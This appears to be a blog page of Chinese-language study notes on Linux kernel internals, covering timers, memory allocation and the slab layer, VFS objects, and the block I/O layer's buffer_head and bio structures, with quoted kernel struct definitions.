<h3 id="定时器"><a href="#定时器" class="headerlink" title="定时器"></a>定时器</h3><h4 id="使用定时器"><a href="#使用定时器" class="headerlink" title="使用定时器"></a>使用定时器</h4><p>当前节拍计数等于或大于指定超时时，内核就开始执行定时器处理函数。</p>
<p>当del_timer()返回后，可以保证的只是将来不会再被激活，但是在多处理器机器上的定时器中断可能已经在其他处理器上运行了。</p>
<h4 id="定时器竞争条件"><a href="#定时器竞争条件" class="headerlink" title="定时器竞争条件"></a>定时器竞争条件</h4><h4 id="实现定时器"><a href="#实现定时器" class="headerlink" title="实现定时器"></a>实现定时器</h4><h3 id="延迟执行"><a href="#延迟执行" class="headerlink" title="延迟执行"></a>延迟执行</h3><h4 id="忙等待"><a href="#忙等待" class="headerlink" title="忙等待"></a>忙等待</h4><p>忙等待（忙循环）的实现很简单——在循环中不断旋转直到希望的时钟节拍数耗尽。</p>
<h4 id="短延迟"><a href="#短延迟" class="headerlink" title="短延迟"></a>短延迟</h4><h4 id="schedule-timeout"><a href="#schedule-timeout" class="headerlink" title="schedule_timeout()"></a>schedule_timeout()</h4><p>该方法会让需要延迟执行的任务睡眠到指定的延迟时间耗尽后再重新运行。但该方法也不能保证睡眠时间正好等于指定的延迟时间，只能尽量使睡眠时间接近指定的延迟时间。当指定的时间到期后，内核唤醒被延迟的任务并将其重新放回运行队列。</p>
<p>在调用该方法前，必须首先将任务设置为TASK_INTERRUPTIBLE或TASK_UNINTERRUPTIBLE两种状态之一，否则任务不会睡眠。</p>
<h5 id="schedule-timeout-的实现"><a href="#schedule-timeout-的实现" class="headerlink" title="schedule_timeout()的实现"></a>schedule_timeout()的实现</h5><p>该函数用原始的名字timer创建了一个定时器timer，然后设置超时时间timeout，设置超时执行函数process_timeout()；接着激活定时器而且调用schedule()。因为任务标识为TASK_INTERRUPTIBLE或TASK_UNINTERRUPTIBLE，所以调度程序不会再选择该任务投入运行，而会选择其他新任务运行。</p>
<p>当定时器超时时，process_timeout()函数会被调用，将任务设置为TASK_RUNNING状态，然后将其放入运行队列。</p>
<p>如果任务提前被唤醒（如收到信号），那么定时器被撤销，process_timeout()函数返回剩余的时间。</p>
<h2 id="内存管理"><a href="#内存管理" class="headerlink" title="内存管理"></a>内存管理</h2><h3 id="页"><a href="#页" class="headerlink" title="页"></a>页</h3><p>内核把物理页作为内存管理的基本单位。</p>
<p>内核用struct page结构表示系统中的每个物理页，该结构位于&lt;linux/mm_types.h&gt;：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> &#123;</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> flags;	<span class="comment">//存放页的状态，定义在&lt;linux/page-flags.h&gt;中</span></span><br><span class="line">	<span class="keyword">atomic_t</span> _count;	<span class="comment">//存放页的引用计数</span></span><br><span class="line">	<span class="keyword">union</span> &#123;</span><br><span class="line">		<span class="keyword">atomic_t</span> _mapcount	</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">			u16 inuse;</span><br><span class="line">			u16 objects;</span><br><span class="line">		&#125;;</span><br><span class="line">	&#125;;</span><br><span class="line">	<span class="keyword">union</span> &#123;</span><br><span class="line">	    <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">		<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">private</span>;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">address_space</span> *<span class="title">mapping</span>;</span></span><br><span class="line">	    &#125;;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> NR_CPUS &gt;= CONFIG_SPLIT_PTLOCK_CPUS</span></span><br><span class="line">	    <span class="keyword">spinlock_t</span> ptl;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	    <span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache</span> *<span class="title">slab</span>;</span></span><br><span class="line">	    <span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">first_page</span>;</span></span><br><span class="line">	&#125;;</span><br><span class="line">	<span class="keyword">union</span> &#123;</span><br><span class="line">		<span class="keyword">pgoff_t</span> index;</span><br><span class="line">		<span class="keyword">void</span> *freelist;</span><br><span class="line">	&#125;;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">lru</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> defined(WANT_PAGE_VIRTUAL)</span></span><br><span class="line">	<span class="keyword">void</span> *<span class="keyword">virtual</span>;	<span class="comment">//即页的虚拟地址。		</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_CGROUP_MEM_RES_CTLR</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> page_cgroup;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>一个页可也由页缓存使用（这时，mapping域指向这个页关联的address_space对象），或者作为私有数据（由private指向），或者作为进程页表中的映射。</p>
<p>page结构与物理页相关，因此，该结构对页的描述只是短暂的。</p>
<h3 id="区"><a href="#区" class="headerlink" title="区"></a>区</h3><p>Linux主要使用了四种区：</p>
<p>ZONE_DMA——这个区包含的页能用来执行DMA操作。</p>
<p>ZONE_DMA32——这个区与ZONE_DMA不同之处在于这些页面只能被32位设备访问。</p>
<p>ZONE_NORMAL——这个区包含的都是能正常映射的页。</p>
<p>ZONE_HIGHEM——这个区包含“高端内存”，其中的页并不能永久地映射到内核地址空间。</p>
<p>这些区定义在&lt;linux/mmzone.h&gt;中。</p>
<p>每个区都用struct zone表示，定义在&lt;linux/mmzone.h&gt;中：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">zone</span> &#123;</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span>		pages_min, pages_low, pages_high;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span>		lowmem_reserve[MAX_NR_ZONES];</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_NUMA</span></span><br><span class="line">	<span class="keyword">int</span> node;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span>		min_unmapped_pages;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span>		min_slab_pages;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">per_cpu_pageset</span>	*<span class="title">pageset</span>[<span class="title">NR_CPUS</span>];</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">per_cpu_pageset</span>	<span class="title">pageset</span>[<span class="title">NR_CPUS</span>];</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	<span class="keyword">spinlock_t</span>		lock;	<span class="comment">//防止并发访问</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_MEMORY_HOTPLUG</span></span><br><span class="line">	<span class="keyword">seqlock_t</span>		span_seqlock;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">free_area</span>	<span class="title">free_area</span>[<span class="title">MAX_ORDER</span>];</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> CONFIG_SPARSEMEM</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span>		*pageblock_flags;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	ZONE_PADDING(_pad1_)</span><br><span class="line">	<span class="keyword">spinlock_t</span>		lru_lock;	</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span>	<span class="title">active_list</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span>	<span class="title">inactive_list</span>;</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span>		nr_scan_active;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span>		nr_scan_inactive;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span>		pages_scanned;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span>		flags;</span><br><span class="line">	<span class="keyword">atomic_long_t</span>		vm_stat[NR_VM_ZONE_STAT_ITEMS];</span><br><span class="line">	<span class="keyword">int</span> prev_priority;</span><br><span class="line">	ZONE_PADDING(_pad2_)</span><br><span class="line">	<span class="keyword">wait_queue_head_t</span>	* wait_table;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span>		wait_table_hash_nr_entries;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span>		wait_table_bits;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">pglist_data</span>	*<span class="title">zone_pgdat</span>;</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span>		zone_start_pfn;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span>		spanned_pages;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span>		present_pages;</span><br><span class="line">	<span class="keyword">const</span> <span class="keyword">char</span>		*name;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>内核启动期间初始化name值，代码位于mm/page_alloc.c中。</p>
<h3 id="获得页"><a href="#获得页" class="headerlink" title="获得页"></a>获得页</h3><p>内核提供了请求内存的底层机制，并提供了对它进行访问的几个接口，所有接口都以页为单位分配内存，定义于&lt;linux/gfp.h&gt;中。</p>
<h3 id="kmalloc"><a href="#kmalloc" class="headerlink" title="kmalloc()"></a>kmalloc()</h3><p>所分配的内存在物理上是连续的。</p>
<p>kmalloc()在&lt;linux/slab.h&gt;中声明。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> * <span class="title">kmalloc</span><span class="params">(<span class="keyword">size_t</span> <span class="built_in">size</span>, <span class="keyword">gfp_t</span> flags)</span></span>;</span><br></pre></td></tr></table></figure>

<h4 id="gfp-mask标志"><a href="#gfp-mask标志" class="headerlink" title="gfp_mask标志"></a>gfp_mask标志</h4><p>这些标志可以分为三类：行为修饰符、区修饰符及类型。</p>
<p>所有标志在&lt;linux/gfp.h&gt;中声明。</p>
<h5 id="行为修饰符"><a href="#行为修饰符" class="headerlink" title="行为修饰符"></a>行为修饰符</h5><p>表示内核应当如何分配所需的内存。</p>
<h5 id="区修饰"><a href="#区修饰" class="headerlink" title="区修饰"></a>区修饰</h5><p>表示从哪儿分配内存。</p>
<h5 id="类型"><a href="#类型" class="headerlink" title="类型"></a>类型</h5><p>组合了行为修饰和区修饰，将各种组合归纳为不同类型。</p>
<h4 id="kfree"><a href="#kfree" class="headerlink" title="kfree()"></a>kfree()</h4><p>kfree(NULL)是安全的。</p>
<h3 id="vmalloc"><a href="#vmalloc" class="headerlink" title="vmalloc()"></a>vmalloc()</h3><p>该函数工作方式类似于kmalloc()，只不过分配的内存虚拟地址连续，而物理地址则无须连续。</p>
<p>vmalloc()函数声明在&lt;linux/vmalloc.h&gt;中，定义在&lt;mm/vmalloc.c&gt;中。</p>
<p>获得的内存可用vfree()释放。</p>
<h3 id="slab层"><a href="#slab层" class="headerlink" title="slab层"></a>slab层</h3><h5 id="slab层的设计"><a href="#slab层的设计" class="headerlink" title="slab层的设计"></a>slab层的设计</h5><p>每个高速缓存可用由多个slab组成，slab由一个或多个物理上连续的页组成。每个slab都包含一些对象成员。每个slab处于三种状态之一：满、部分满或空。</p>
<p>当内核的某一部分需要一个新的对象时，先从部分满的slab中进行分配；如果没有部分满的slab，就从空的slab中进行分配；如果没有空的slab，就要创建一个slab了。</p>
<p>例如，struct inode就由inode_cachep高速缓存进行分配，这种高速缓存由一个或多个slab组成，每个slab包含尽可能多的struct inode对象。</p>
<p>每个高速缓存都使用kmem_cache结构来表示，这个结构包含三个链表：slabs_full、slabs_partial和slabs_empty，均存放在kmem_list3结构内，该结构在mm/slab.c中定义。这些链表包含的高速缓存中的所有slab。</p>
<p>slab描述符struct slab用来描述每个slab：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">slab</span>&#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">list</span>;</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> colouroff;</span><br><span class="line">	<span class="keyword">void</span> *s_mem;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> inuse;</span><br><span class="line">	<span class="keyword">kmem_bufctl_t</span> <span class="built_in">free</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>slab描述符要么在slab之外另行分配，要么就放在slab自身开始的地方。如果slab很小，或者slab内存有足够的空间容纳slab描述符，那么描述符就存放在slab里面。</p>
<p>slab分配器可以创建新的slab，这是通过__get_free_pages()低级内核页分配器进行的。</p>
<p>只有在下列情况下才会调用释放函数：当可用内存变得紧缺时，系统试图释放出更多内存以供使用；或者当高速缓存显式地被撤销时。</p>
<h4 id="slab分配器接口"><a href="#slab分配器接口" class="headerlink" title="slab分配器接口"></a>slab分配器接口</h4><h3 id="在栈上的静态分配"><a href="#在栈上的静态分配" class="headerlink" title="在栈上的静态分配"></a>在栈上的静态分配</h3><h4 id="单页内核栈"><a href="#单页内核栈" class="headerlink" title="单页内核栈"></a>单页内核栈</h4><p>中断栈为每个进程提供一个用于中断处理程序的栈。</p>
<h3 id="高端内存的映射"><a href="#高端内存的映射" class="headerlink" title="高端内存的映射"></a>高端内存的映射</h3><h4 id="永久映射"><a href="#永久映射" class="headerlink" title="永久映射"></a>永久映射</h4><p>要映射一个给定的page结构到内核地址空间，可以使用定义在文件&lt;linux/highmem.h&gt;中的这个函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">kmap</span><span class="params">(struct page *page)</span></span>;</span><br></pre></td></tr></table></figure>

<p>这个函数可以睡眠，因此只能用在进程上下文中。</p>
<p>解除映射：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">kunmap</span><span class="params">(struct page *page)</span></span>;</span><br></pre></td></tr></table></figure>

<h4 id="临时映射"><a href="#临时映射" class="headerlink" title="临时映射"></a>临时映射</h4><p>临时银蛇可以用在不能睡眠的地方，因为获取映射时绝不会阻塞，同时禁止内核抢占：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">kmap_atomic</span><span class="params">(struct page *page, <span class="keyword">enum</span> km_type type)</span></span>;</span><br></pre></td></tr></table></figure>



<p>参数type描述了临时映射的目的，定义于&lt;asm/kmap_types.h&gt;中。</p>
<p>取消映射：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">kunmap_atomic</span><span class="params">(<span class="keyword">void</span> *kvaddr, <span class="keyword">enum</span> km_type type)</span></span>;</span><br></pre></td></tr></table></figure>

<p>除非激活了内核抢占，否则kunmap_atomic()无须做什么实际的事情，只有在下一个临时映射到来前上一个临时映射才有效。下一个原子映射将自动覆盖前一个映射。</p>
<h3 id="每个CPU的分配"><a href="#每个CPU的分配" class="headerlink" title="每个CPU的分配"></a>每个CPU的分配</h3><h4 id="新的每个CPU接口"><a href="#新的每个CPU接口" class="headerlink" title="新的每个CPU接口"></a>新的每个CPU接口</h4><p>&lt;linux/percpu.h&gt;中声明了所有接口操作例程，可以在mm/slab.c和&lt;asm/percpu.h&gt;中找到定义。</p>
<h2 id="虚拟文件系统"><a href="#虚拟文件系统" class="headerlink" title="虚拟文件系统"></a>虚拟文件系统</h2><p>VFS使得用户可以直接使用open()、read()和write()这样的系统调用而无须考虑具体文件系统和实际物理介质。</p>
<h3 id="文件系统抽象层"><a href="#文件系统抽象层" class="headerlink" title="文件系统抽象层"></a>文件系统抽象层</h3><p>VFS提供了一个通用文件系统模型，该模型囊括了任何文件系统的常用功能集合行文。</p>
<p><img src="./img/1586854070.jpg" alt="从用户控件的write调用到数据被写入磁盘介质"></p>
<h3 id="Unix文件系统"><a href="#Unix文件系统" class="headerlink" title="Unix文件系统"></a>Unix文件系统</h3><p>Unix使用了四种和文件系统相关的传统抽象概念：文件、目录项、索引节点和安装点。</p>
<p>在Unix中，文件系统被安装在一个特定的安装点上，该安装点在全局层次结构中被称作命名空间，所有的已安装文件系统都作为根文件系统树的枝叶出现在系统中。</p>
<p>Unix系统将文件的相关信息和文件本身这两个概念加以区分。文件相关信息有时被称作文件的元数据，被存储在一个单独的数据结构中，该结构被称为索引节点。</p>
<p>文件系统的控制信息存储在超级块中，超级块是一种包含文件系统信息的数据结构。</p>
<h3 id="VFS对象及其数据结构"><a href="#VFS对象及其数据结构" class="headerlink" title="VFS对象及其数据结构"></a>VFS对象及其数据结构</h3><p>VFS中有四个主要的对象类型：</p>
<ul>
<li>超级块对象——它代表一个具体的已安装的文件系统。</li>
<li>索引节点对象——它代表一个具体文件。</li>
<li>目录项对象——它代表一个目录项，是路径的一个组成部分。</li>
<li>文件对象——它代表由进程打开的文件。</li>
</ul>
<p>每个主要对象中都包含一个操作对象，这些操作对象描述了内核针对主要对象可以使用的方法：</p>
<ul>
<li>super_operations对象，其中包括内核针对特定文件系统所能调用的方法，如write_inode()和sysnc_fs()等方法。</li>
<li>inode_operations对象，其中包括内核针对特定文件所能调用的方法，比如create()和link()等方法。</li>
<li>dentry_operations对象，其中包括内核针对特定目录所能调用的方法，比如d_compare()和d_delete等方法。</li>
<li>file_operations对象，其中包括针对针对已打开文件所能调用的方法，比如read()和write()等方法。</li>
</ul>
<p>操作对象作为一个结构体指针来实现，此结构体重包含指向操作其父对象的函数指针。</p>
<h3 id="超级块对象"><a href="#超级块对象" class="headerlink" title="超级块对象"></a>超级块对象</h3><p>该对象用于存储特定文件系统的信息，通常对应于存放在磁盘待定扇区中的文件系统超级块或文件系统控制块。</p>
<p>超级块对象由super_block结构体表示，定义在&lt;linux/fs.h&gt;中。</p>
<p>创建、管理和撤销超级快对象的代码位于文件fs/super.c中。</p>
<h3 id="超级块操作"><a href="#超级块操作" class="headerlink" title="超级块操作"></a>超级块操作</h3><p>操作块对象中的s_op域指向超级块的操作函数表。超级块操作函数表又super_operations结构体表示，定义在文件&lt;linux/fs.h&gt;中。</p>
<p>超级块操作函数都是由VFS在进程上下文中调用。除了dirty_inode()，其他函数在必要时都可以阻塞。</p>
<p>如果VFS发现操作函数指针是NULL，那么它要么就会调用通用函数执行相应操作，要么什么也不做。</p>
<h3 id="索引节点对象"><a href="#索引节点对象" class="headerlink" title="索引节点对象"></a>索引节点对象</h3><p>索引节点对象包含了内核在操作文件或目录时需要的全部信息。</p>
<p>索引节点对象由inode结构体表示，它定义在文件&lt;linux/fs.h&gt;中。</p>
<p>索引节点仅当文件被访问时，才在内存中创建。</p>
<h3 id="索引节点操作"><a href="#索引节点操作" class="headerlink" title="索引节点操作"></a>索引节点操作</h3><p>索引节点对象中用i_op(inode_operations)来存储操作函数表，该结构体定义在文件&lt;linux/fs.h&gt;中。</p>
<h3 id="目录项对象"><a href="#目录项对象" class="headerlink" title="目录项对象"></a>目录项对象</h3><p>目录项对象由dentry结构体表示，定义在&lt;linux/dcache.h&gt;中。</p>
<h4 id="目录项状态"><a href="#目录项状态" class="headerlink" title="目录项状态"></a>目录项状态</h4><p>目录项对象有三种有效状态：被使用、未被使用和负状态。</p>
<p>一个被使用的目录项对应一个有效的索引节点，并且表明该对象存在一个或多个使用者（d_count为正值）。一个目录项处于被使用状态，意味着它正被VFS使用并且指向有效的数据，因此不能被丢弃。</p>
<p>一个被使用的目录项对应一个有效的索引节点，但是d_count为0,。该目录表项仍然指向一个有效对象，而且被保留在缓存中以便需要时使用它。</p>
<p>一个负状态的目录项没有对应的有效索引节点（d_inode为NULL），因为索引节点已被删除，或路径不再正确，但是目录项仍然保留，以便快速解析以后的路径查询。</p>
<h4 id="目录项缓存"><a href="#目录项缓存" class="headerlink" title="目录项缓存"></a>目录项缓存</h4><p>内核将目录项对象缓存在目录项缓存（dcache）中。目录项缓存包括三个主要部分：</p>
<ul>
<li>“被使用的”目录项链表。将链表通过所以节点对象中的i_dentry项链接相关的索引节点。</li>
<li>“最近被使用的”双向链表。该链表含有未被使用和负状态的目录项对象。因为该链表总是在头部插入目录项，故链头节点的数据总比链尾节点的数据要新。删除时，从链尾删除节点项。</li>
<li>散列表和相应的散列函数用来快速地将给定路径解析为相关目录项对象。</li>
</ul>
<p>散列表由数组dentry_hashtable表示，其中每个元素都是一个指向具有相同键值的目录项对象链表指针。</p>
<p>实际的散列值由d_hash()函数计算。</p>
<p>查找散列表要通过d_lookup()函数。</p>
<h3 id="目录项操作"><a href="#目录项操作" class="headerlink" title="目录项操作"></a>目录项操作</h3><p>dentry_operation结构体指明了VFS操作目录项的所有方法，该结构体定义在文件&lt;linux/dcache.h&gt;中。</p>
<h3 id="文件对象"><a href="#文件对象" class="headerlink" title="文件对象"></a>文件对象</h3><p>文件对象表示进程已打开的文件。</p>
<p>文件对象由file结构体表示，定义在文件&lt;linux/fs.h&gt;中。</p>
<p>文件对象通过f_dentry指针指向相关的目录项对象。</p>
<h3 id="文件操作"><a href="#文件操作" class="headerlink" title="文件操作"></a>文件操作</h3><p>文件对象的操作由file_operations结构体表示，定义在文件&lt;linux/fs.h&gt;中。</p>
<h3 id="和文件系统相关的数据结构"><a href="#和文件系统相关的数据结构" class="headerlink" title="和文件系统相关的数据结构"></a>和文件系统相关的数据结构</h3><p>file_system_type——该结构用来描述各种特定文件系统类型，如ext3、ext4或UDF。</p>
<p>vfsmount——用来描述一个安装文件系统的实例。</p>
<p>file_system_type定义在&lt;linux/fs.h&gt;中。</p>
<p>每种文件系统，不管有多少实例安装到系统中，还是根本没有安装到系统中，都只有一个file_system_type结构。</p>
<p>当文件系统被实际安装时，将有一个vfsmount结构体在安装点被创建。vfsmount结构被定义在&lt;linux/mount.h&gt;中。</p>
<p>vfsmount保存了安装时指定的标志信息，存储在mnt_flages域中。标志信息定义在&lt;linux/mount.h&gt;中。</p>
<h3 id="和进程相关的数据结构"><a href="#和进程相关的数据结构" class="headerlink" title="和进程相关的数据结构"></a>和进程相关的数据结构</h3><p>有三个数据结构将VFS层和系统的进程联系在一起，分别是：file_struct、fs_struct和namespace结构体。</p>
<p>file_struct结构体定义在&lt;linux/fdtable.h&gt;中。该结构体由进程描述符中的files目录项指向。所有与单个进程相关的信息都包含在其中。</p>
<p>fs_struct结构体定义在&lt;linus/fs_struct.h&gt;中。该结构体由进程描述符的fs域指向。它包含文件系统和进程相关的信息。</p>
<p>namespace结构体定义在&lt;linux/mmt_namespace.h&gt;中。由进程描述符中的mmt_namespace域指向。单进程命名空间使得每一个进程在系统中都看的唯一的安装文件系统——不仅是唯一的根目录，而且是唯一的文件系统层次结构。</p>
<p>默认情况下，所有进程共享同一命名空间。只有在clone()操作时使用CLONE_NEWS标志，才会给进程一个唯一的命名空间结构体的拷贝。</p>
<h2 id="块I-O层"><a href="#块I-O层" class="headerlink" title="块I/O层"></a>块I/O层</h2><p>系统中能随机（不按顺序）访问固定大小数据片的硬件设备称作块设备。这些固定大小的数据片就称作块。</p>
<p>字符设备按照字符流的方式被有序访问。</p>
<h3 id="剖析一个块设备"><a href="#剖析一个块设备" class="headerlink" title="剖析一个块设备"></a>剖析一个块设备</h3><p>块设备中最小的可寻址单元是扇区（有时也称作“硬扇区”、“设备块”）。</p>
<p>块（也称作“文件块”或“I/O块”）是最小逻辑可寻址单元，块是文件系统的一种抽象——只能基于块来访问文件系统。块只能数倍于扇区大小。</p>
<p><img src="./img/1586921047.png" alt="扇区与缓冲区之间的关系"></p>
<h3 id="缓冲区与缓冲区头"><a href="#缓冲区与缓冲区头" class="headerlink" title="缓冲区与缓冲区头"></a>缓冲区与缓冲区头</h3><p>当一个块被调入内存时（即在读入后或等待写出时），它要存储在一个缓冲区中。每个缓冲区与一个块对应，它相当与是磁盘块在内存中的表示。</p>
<p>每一个缓冲区都有一个对应的描述，该描述符用buffer_head结构体表示，称作缓冲区头定义在文件&lt;linux/buffer_head.h&gt;中，它包含了内核操作缓冲区所需要的全部信息。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">buffer_head</span> &#123;</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> b_state;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">buffer_head</span> *<span class="title">b_this_page</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">b_page</span>;</span></span><br><span class="line">	<span class="keyword">sector_t</span> b_blocknr;</span><br><span class="line">	<span class="keyword">size_t</span> b_size;</span><br><span class="line">	<span class="keyword">char</span> *b_data;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">block_device</span> *<span class="title">b_bdev</span>;</span></span><br><span class="line">	<span class="keyword">bh_end_io_t</span> *b_end_io;</span><br><span class="line"> 	<span class="keyword">void</span> *b_private;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">b_assoc_buffers</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">address_space</span> *<span class="title">b_assoc_map</span>;</span></span><br><span class="line">	<span class="keyword">atomic_t</span> b_count;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>其中b_state表示缓冲区状态。合法标志存放在bh_state_bits枚举中，该枚举在&lt;linux/buffer_head.h&gt;中定义。</p>
<p>b_count域表示缓冲区的使用计数，可以通过两个定义在文件&lt;linux/buffer_head.h&gt;中的内联函数对此域进行增减。</p>
<p>与缓冲区对应的磁盘物理块由b_blocknr-th域索引，该值是b_bdev域指明的块设备中的逻辑块号。</p>
<p>与缓冲区对应的内存物理页由b_page域表示。另外，b_data域直接指向相应的块，块的大小由b_size域表示。</p>
<p>缓冲头的目的在于描述磁盘块和物理内存缓冲区之间的映射关系。</p>
<h3 id="bio结构体"><a href="#bio结构体" class="headerlink" title="bio结构体"></a>bio结构体</h3><p>内核中块I/O操作的基本容器由bio结构体表示，定义在&lt;linux/bio.h&gt;中。该结构代表了正在现场的（活动的）以及片段链表形式组织的块I/O操作。一个片段是一小块连续的内存缓冲区。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bio</span> &#123;</span></span><br><span class="line">	<span class="keyword">sector_t</span>		bi_sector;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">bio</span>		*<span class="title">bi_next</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">block_device</span>	*<span class="title">bi_bdev</span>;</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span>		bi_flags;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span>		bi_rw;</span><br><span class="line">	<span class="keyword">unsigned</span> short		bi_vcnt;</span><br><span class="line">	<span class="keyword">unsigned</span> short		bi_idx;</span><br><span class="line">	<span class="keyword">unsigned</span> short		bi_phys_segments;</span><br><span class="line">	<span class="keyword">unsigned</span> short		bi_hw_segments;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span>		bi_size;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span>		bi_hw_front_size;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span>		bi_hw_back_size;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span>		bi_max_vecs;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">bio_vec</span>		*<span class="title">bi_io_vec</span>;</span></span><br><span class="line">	<span class="keyword">bio_end_io_t</span>		*bi_end_io;</span><br><span class="line">	<span class="keyword">atomic_t</span>		bi_cnt;</span><br><span class="line">	<span class="keyword">void</span>			*bi_private;</span><br><span class="line">	<span class="keyword">bio_destructor_t</span>	*bi_destructor;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><img src="./img/1586931445.png" alt="bio结构体、bio_vec结构体和page结构体之间的关系"></p>
<h4 id="I-O向量"><a href="#I-O向量" class="headerlink" title="I/O向量"></a>I/O向量</h4><p>bi_io_vec域指向一个bio_vec结构体数组，该结构体链表包含了一个特定I/O操作所需要使用到的片段。每个bio_vec结构都是一个形式为&lt;page,offset,len&gt;的向量，它描述的是一个特定的片段：片段所在的物理页、块在物理页中的偏移位置、从给定偏移量开始的块长度。整个bio_io_vec结构体数组表示了一个完成的缓冲区。bio_vec结构定义在&lt;linux/bio.h&gt;中。</p>
<p>bi_cnt域用来描述bi_io_vec所指向的bio_vec数组中的向量数目。当块I/O操作执行完毕后，bi_idx域指向数组的当前索引。</p>
<p>bi_cnt若为0，则应该撤销该bio结构体，并释放它占用的内存。</p>
<p>bi_private域是属于拥有者（即创建者）的私有域，只有创建了bio结构的拥有者可以读写该域。</p>
<h3 id="请求队列"><a href="#请求队列" class="headerlink" title="请求队列"></a>请求队列</h3><p>块设备将它们挂起的块I/O请求保存在请求队列中，该队列由reques_queue结构体表示，定义在&lt;linux/blkdev.h&gt;中，包含一个双向请求链表以及相关控制信息。</p>
